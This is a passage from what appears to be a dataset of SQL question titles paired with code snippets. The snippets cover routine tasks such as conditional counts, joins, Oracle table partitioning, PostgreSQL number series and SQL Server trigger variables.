        CASE WHEN Stage >=3 THEN (SELECT s2.StageDate FROM @Stages s2 Where s2.Name = s1.Name and s2.Stage =3)  Else NULL END As Stage3Date
 FROM @Stages s1
"
6901,50549,Count number of records with specific values,"SELECT
   COUNT(DISTINCT CASE WHEN member_1 = 'Alice' THEN member_1 END) +
   COUNT(DISTINCT CASE WHEN member_2 = 'Alice' THEN member_2 END) +
   COUNT(DISTINCT CASE WHEN member_3 = 'Alice' THEN member_3 END)
FROM tablename
WHERE 'Alice' IN(member_1, member_2, member_3);
"
31363,16194,How to write a relax-join expression without using if-else?,"SELECT * 
FROM R
CROSS JOIN S
WHERE NOT EXISTS (
    SELECT *
    FROM R
    NATURAL JOIN S
)

UNION

SELECT *
FROM R
NATURAL JOIN S
"
4174,60128,Automatically Generating SQL Schema from XML,"I:\>xsd
Microsoft (R) Xml Schemas/DataTypes support utility
[Microsoft (R) .NET Framework, Version 1.0.3705.0]
Copyright (C) Microsoft Corporation 1998-2001. All rights reserved.


xsd.exe -
    Utility to generate schema or class files from given source.

xsd.exe <schema>.xsd /classes|dataset [/e:] [/l:] [/n:] [/o:] [/uri:]
xsd.exe <assembly>.dll|.exe [/outputdir:] [/type: [...]]
xsd.exe <instance>.xml [/outputdir:]
xsd.exe <schema>.xdr [/outputdir:]
"
37256,47097,SQL — segment by groups,"SELECT CONCAT(base.lower,'-',base.upper) PURCHASE_RANGE, COUNT(userid) NUM_OF_USERS
FROM (
  SELECT 0 lower, 1 upper UNION SELECT 2, 5 UNION SELECT 6,20 UNION SELECT 21,30
) base
LEFT JOIN (
  SELECT userid, SUM(purchase_amount) pa FROM purchases GROUP BY userid
) p
  ON p.pa >= base.lower AND p.pa <= base.upper
GROUP BY base.upper
"
28489,29363,Extending existing partitioning,"CREATE TABLE matt_customer
(
  incident_id          NUMBER,
  customer_id          NUMBER,
  customer_name        VARCHAR2 (400),
  sla_id               NUMBER,
  failure_start_date   DATE,
  failure_end_date     DATE,
  churn_flag           VARCHAR2 (1),                                                                           -- 0 or 1
  active               VARCHAR2 (1),                                                                           -- 0 or 1
  active_churn_flags   VARCHAR2 (2) GENERATED ALWAYS AS (active || churn_flag) VIRTUAL,
  CONSTRAINT pk_incident_id PRIMARY KEY (incident_id)
)
PARTITION BY RANGE
  (failure_start_date)
  INTERVAL ( NUMTOYMINTERVAL (1, 'MONTH') )
  SUBPARTITION BY LIST
    (active_churn_flags)
    SUBPARTITION TEMPLATE (
      SUBPARTITION sp_ac_00 VALUES ('00'),
      SUBPARTITION sp_ac_01 VALUES ('01'),
      SUBPARTITION sp_ac_10 VALUES ('10'),
      SUBPARTITION sp_ac_11 VALUES ('11'))
  (PARTITION customer_old VALUES LESS THAN (TO_DATE ('01-JAN-2013', 'DD-MON-YYYY')))
ENABLE ROW MOVEMENT
--COMPRESS FOR QUERY LOW;
;
"
35595,41222,MYSQL view not filling up empty spots to fill 1000,"select 
    `q`.`name` AS `name`,
    `q`.`questionUrl` AS `questionUrl`,
    `q`.`miRating` AS `miRating`,
    `q`.`imageUrl` AS `imageUrl`,
    `q`.`foundOn` AS `foundOn`,
    `q`.`myId` AS `myId`
from
    (`question` `q`
    join `feed` `f` ON ((`q`.`myId` = `f`.`question_id`))
    join `tag` `t` ON ((`q`.`myId` = `t`.`question_id`)))
group by `q`.`name`
order by (max(`f`.`timeStamp`) >= (now() - interval 1 day)) desc ,
         max(`t`.`name` like '%popular%') desc,
         rand()
limit 0 , 1000;
"
12749,65263,SQL multiple joins on same table such that an entity has all fields set,"select bannerid, count(bannersize) 
from tbl_banners  
where bannersize in (16, 32, 64, 128, 256, 512, 1024) 
group by bannerid  
having count(bannersize) = 7 ;
"
8259,74656,Sorting data based on the current system date,"SELECT * FROM
(SELECT ""Weekly"",""Quarter"",""SALES"",""Monthly"",week_number FROM fiscal_calendar
  WHERE week_number <= TO_NUMBER(TO_CHAR(SYSDATE,'IW')) 
  ORDER BY  week_number desc) t1
UNION ALL
SELECT * FROM 
(SELECT ""Weekly"",""Quarter"",""SALES"",""Monthly"",week_number FROM fiscal_calendar
  WHERE week_number > TO_NUMBER(TO_CHAR(SYSDATE,'IW'))
  ORDER BY  week_number) t2
"
18501,8805,Access count() return zero. Don't know how to left join,"SELECT s.clubnr, sum(iif(s1.positie = ""KP"", 1, 0 )) AS AantalKeepers
FROM Selectie AS s
    LEFT JOIN Speler AS s1 ON s.spelernr = s1.spelernr
    LEFT JOIN club c ON s.clubnr = c.clubnr
GROUP BY s.clubnr;
"
31820,22814,Find the rating that given to a certian game by each member who rated it in SQL,"SELECT rating, name 
FROM ratings, members 
WHERE gameID = 2 and ratings.memberID = members.id;
"
18154,26762,Should I choose MySQL or MongoDB for this design,"_id 
productId 
productName,
product description,
product category,
product
rating 
comment 
dateCreated 
userId 
username,
userGenger (male/female/unknow)
userAge
userRegisteredDate
"
20949,56964,Using SQL to INSERT number of records based on QUERY,"INSERT INTO new_table(Event, GradeType, Grade)
SELECT Event, CONCAT(Type, n) AS [GradeType], NULL AS Grade
FROM tab
CROSS APPLY (VALUES (1),(2),(3),(4),(5),(6),(7),(8),(9)) AS n(n)
WHERE n <= Fields;
"
16599,45445,One-to-one bidirectional relationship query,"select * from tablename t1,t2 where t1.sender_id = t2.receiver_id and t2.sender_id=t1.receiver_id and Name like follow""
"
35617,34362,order by all columns,"SELECT student.firstname, 
       candidates.partylist, 
       candidates.position 
FROM   student 
       INNER JOIN candidates 
               ON student.student_id = candidates.student_id 
ORDER  BY partylist, 
          CASE position 
            WHEN 'President' THEN 1 
            WHEN 'VicePresident' THEN 2 
            WHEN 'Secretary' THEN 3 
            WHEN 'Treasurer' THEN 4 
            WHEN 'Auditor' THEN 5 
            ELSE 6  -- Here replace 6 with 0
          END 
"
7119,62606,Do I use a crosstab() or case when function to achieve results needed [postgresql],"with cte as (
  select *, max(mo) over() as max_mo
  from Table1
)
select
    type, id, name,
    sum(case when mo <> max_mo then imps else 0 end) as oldimps,
    sum(case when mo <> max_mo then clicks else 0 end) as oldclicks,
    sum(case when mo <> max_mo then conv else 0 end) as oldconv,
    sum(case when mo = max_mo then imps else 0 end) as newimps,
    sum(case when mo = max_mo then clicks else 0 end) as newclicks,
    sum(case when mo = max_mo then conv else 0 end) as newconv
from cte
group by type, id, name
order by id;
"
24668,65010,How can I generate a series of repeating numbers in PostgreSQL?,"SELECT a.n
from generate_series(1, 100) as a(n), generate_series(1, 3)
"
14959,64236,how to test on variables in sql server triggers?,"declare @someVar varchar(50) = 'value1'

if @someVar in ('value1','value2','value3')
   begin
   print 'yes'
   end
"
6676,2253,how to enter series of numbers in a table column,"WITH Temp
AS
(
  SELECT digit
  FROM (VALUES(0),(1),(2),(3),(4),(5),(6),(7),(8),(9)) AS temp(digit)
), Nums
AS
(
  SELECT t3.digit * 100 + t2.digit * 10 + t1.digit + 1  AS id
  FROM         TEMP AS t1
  CROSS JOIN TEMP AS t2
  CROSS JOIN TEMP AS t3
)
SELECT 
  n = 10100 + (id - 1) * 100
from nums
ORDER BY n;
"
26201,2122,Which Oracle table uses a sequence?,"select type, name, line, text
from all_source
where owner = 'MYSCHEMA'
and upper(text) like '%MYSEQ.NEXTVAL%';
"
